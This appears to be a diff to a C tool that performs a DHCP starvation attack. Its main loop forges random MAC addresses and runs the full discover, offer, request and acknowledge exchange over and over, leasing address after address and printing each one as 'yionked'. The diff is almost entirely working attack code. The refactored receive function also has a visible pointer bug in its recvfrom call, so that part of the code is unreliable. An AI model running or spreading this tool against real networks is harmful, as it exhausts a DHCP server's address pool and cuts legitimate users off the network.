@@ -1,4 +1,6 @@
 //# https://www.rfc-editor.org/rfc/rfc2131
+#include <netinet/in.h>
+#include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -98,6 +100,33 @@ err:
     return -2;
 }
 
+///
+// @returns 0 on success
+// @packet[out]
+// @source[out]
+int8_t wait_for_dhcp_respone(int sock,
+                             struct dhcp_packet *packet,
+                             struct sockaddr_in *source)
+{
+    struct pollfd pfd = {
+        .fd = sock,
+        .events = POLLIN
+    };
+
+    if (!poll(&pfd, 1, OFFER_TIMEOUT * 1000)) {
+        return -1;   
+    }
+ 
+    
+    socklen_t addrlen = sizeof(struct sockaddr_in);
+
+    if(recvfrom(sock, packet, sizeof(struct dhcp_packet), 0, (struct sockaddr*)&source, &addrlen) < 0) {
+        return -2;
+    }
+
+    return 0;
+}
+
 //@ Binary representation of a mac is 6 bytes
 void gen_rand_mac(uint8_t r_mac[6])
 {
@@ -148,6 +177,32 @@ uint32_t dhcp_discover(int sock, const uint8_t r_mac[6])
     return transaction_id;
 }
 
+/// Gets the first offer
+//  @server_ip[out]
+//  @offer_ip[out] 
+//  @returns 0 on success
+int8_t dhcp_offer(int sock, u_int32_t transaction_id,
+                 const uint8_t r_mac[6],
+                 struct in_addr *server_ip,
+                 struct in_addr *offer_ip)
+{
+    struct dhcp_packet offer = {0};
+    struct sockaddr_in source = {0};
+
+    int err;
+    if((err = wait_for_dhcp_respone(sock, &offer, &source))) {
+        return err;
+    }
+        
+    if (ntohl(offer.xid) != transaction_id) {
+        return -2;
+    }
+
+    memcpy(server_ip, &source.sin_addr, sizeof(in_addr_t));
+    memcpy(offer_ip, &offer.yiaddr, sizeof(in_addr_t));
+    
+    return 0;    
+}
 
 void dhcp_request(int sock, u_int32_t transaction_id,
                   struct in_addr server_ip,
@@ -184,11 +239,11 @@ void dhcp_request(int sock, u_int32_t transaction_id,
     request.options[5] = 0x1;
     request.options[6] = DHCPREQUEST;
 
-    // set address option
+    // request address
     request.options[7] = 50;
     request.options[8] = 4;
     memcpy(&request.options[9], &request_ip, sizeof(request_ip));
-
+    // ..from server address 
     request.options[13] = 54;
     request.options[14] = 4;
     memcpy(&request.options[15], &server_ip, sizeof(server_ip));
@@ -205,51 +260,20 @@ void dhcp_request(int sock, u_int32_t transaction_id,
            sizeof(broadcast_address));
 }
 
-/// Gets the firs offer 
-void get_offer(int sock, u_int32_t transaction_id, const uint8_t r_mac[6])
+void dhcp_ack(int sock, struct in_addr request_ip)
 {
-    struct dhcp_packet offer = {0};
-    // fd_set readfds;
-    struct timeval timeout = {
-        .tv_sec = OFFER_TIMEOUT,
-        .tv_usec = 0
-    };
+    struct dhcp_packet ack = {0};
+    struct sockaddr_in source = {0};
 
-    struct pollfd pfd = {
-        .fd = sock,
-        .events = POLLIN
-    };
-
-
-    // FD_ZERO(&readfds);
-    // FD_SET(sock, &readfds);
-
-    // select(sock + 1, &readfds, NULL, NULL, &timeout);
-
-    // if (!FD_ISSET(sock, &readfds)) {
-        // return;
-    // }
-
-    if (!poll(&pfd, 1, OFFER_TIMEOUT * 1000)) {
-        return;   
+    if(wait_for_dhcp_respone(sock, &ack, &source)) {
+       return;
     }
     
-
-    struct sockaddr_in source = {0};
-    socklen_t addrlen = sizeof(source);
-
-    if(recvfrom(sock, &offer, sizeof(offer), 0, (struct sockaddr*)&source, &addrlen) < 0) {
-        return;
+    if(request_ip.s_addr == ack.ciaddr.s_addr)
+    {
+        fprintf(stdout, "%s yionked\n", inet_ntoa(request_ip));   
     }
-    if (ntohl(offer.xid) != transaction_id) {
-        return;
-    }
-            
-    dhcp_request(sock, transaction_id, source.sin_addr, offer.yiaddr, r_mac);
-
-    fprintf(stdout, "%s yionked\n", inet_ntoa(offer.yiaddr));
 }
-
 
 int main(const int argc, char *argv[])
 {
@@ -270,10 +294,20 @@ int main(const int argc, char *argv[])
     }
 
     uint8_t r_mac[6];
+    struct in_addr s_ip, o_ip;
+
     while (true) {
         gen_rand_mac(r_mac);
+        //discover
         uint32_t transaction_id = dhcp_discover(sockfd, r_mac);
-        get_offer(sockfd, transaction_id, r_mac);
+        //offer
+        if(dhcp_offer(sockfd, transaction_id, r_mac, &s_ip, &o_ip)) {
+            continue;
+        }
+        //request
+        dhcp_request(sockfd, transaction_id, s_ip, o_ip, r_mac);
+        //aknowledge
+        dhcp_ack(sockfd, o_ip);
     }
 
     close(sockfd);
